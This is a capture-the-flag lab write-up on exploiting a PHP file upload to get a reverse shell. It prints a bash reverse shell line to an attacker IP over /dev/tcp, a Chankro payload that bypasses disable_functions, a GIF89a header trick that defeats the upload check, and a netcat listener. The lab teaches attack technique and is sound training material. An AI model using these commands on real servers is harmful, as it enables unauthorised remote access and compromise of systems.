# **File Inclusion & Reverse Shell Exploitation**

### **Introduction**

In this CTF challenge, we will explore the exploitation of a File Inclusion vulnerability to gain access to a server through a reverse shell. We will use tools such as nmap, gobuster, and Chankro to identify and exploit the vulnerability.

### **Step 1: Verify Connectivity with the Target Machine**

Before taking any action, we check if we can communicate with the target machine:

```bash
ping 10.10.80.32

```

### **Step 2: Scanning for Open Ports**

We perform a scan with nmap to identify active services on the target machine:

```bash
nmap -sSVC 10.10.80.32

```

The results show that the open ports are 22 (SSH) and 80 (HTTP).

### **Step 3: Web Directory Enumeration**

We use gobuster to discover directories and files on the HTTP server:

```bash
gobuster dir -u http://10.10.80.32 -w /usr/share/wordlists/dirb/common.txt

```

Among the results, we find:

- A homepage that allows file uploads.
- A `phpinfo.php` file.
- An `uploads/` directory.

### **Step 4: Identifying the DOCUMENT_ROOT**

We access the `phpinfo.php` file in the browser and look for the `DOCUMENT_ROOT` value in the **PHP ENVIRONMENT** section. In this case, we obtain:

```
DOCUMENT_ROOT = /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db

```

This value is crucial for the exploitation process.

### **Step 5: Preparing the Reverse Shell File**

We create a file that will contain our reverse shell:

```bash
touch rshell

```

We edit the file with nano:

```bash
nano rshell

```

We add the following command line:

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.6.117/1234 0>&1'

```

We save and close the file.

### **Step 6: Cloning and Setting Up Chankro**

We download Chankro, the tool that will help us bypass `disable_functions` in PHP:

```bash
git clone https://github.com/TarlogicSecurity/Chankro.git
cd Chankro/

```

We check the usage parameters:

```bash
python2 chankro.py --help

```

We grant execution permissions to the script:

```bash
chmod +x chankro.py

```

We execute Chankro with the following parameters:

```bash
python chankro.py --arch 64 --input rshell --output tryhackme.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db

```

We confirm that the `tryhackme.php` file has been successfully created:

```bash
ls

```

### **Step 7: Modifying the File for Successful Upload**

We edit `tryhackme.php` and add the following line at the beginning of the file:

```bash
GIF89a;

```

This trick makes the server believe that the file is a valid image.

### **Step 8: Uploading the Malicious File**

We upload `tryhackme.php` through the upload form on the website. Then, we check the `uploads/` directory to confirm that the file is available.

### **Step 9: Setting Up the Reverse Shell Listener**

Before executing the file on the server, we configure our machine to listen for the reverse connection:

```bash
nc -lvnp 1234

```

This command starts netcat in listening mode on port 1234, allowing us to capture the incoming connection from the server.

### **Step 10: Executing the Payload and Gaining Shell Access**

By accessing `http://10.10.80.32/uploads/tryhackme.php`, our reverse shell executes, granting us access to the server.

### **Step 11: Privilege Escalation and Finding the Flag**

We execute the following commands inside the server:

```bash
id   # Verify the current user
ls   # List files in the current directory
cd /home  # Navigate to the home directory
cd s4vi  # Enter the target user's directory
ls   # List files in the personal folder

```

We identify the `flag.txt` file, successfully completing the challenge.

### **Conclusion**

In this write-up, we have explored a **File Inclusion** attack, bypassed PHP restrictions, and gained remote access using a **reverse shell**. This exercise highlights the importance of properly validating uploaded files and restricting dangerous functions on web servers.

---
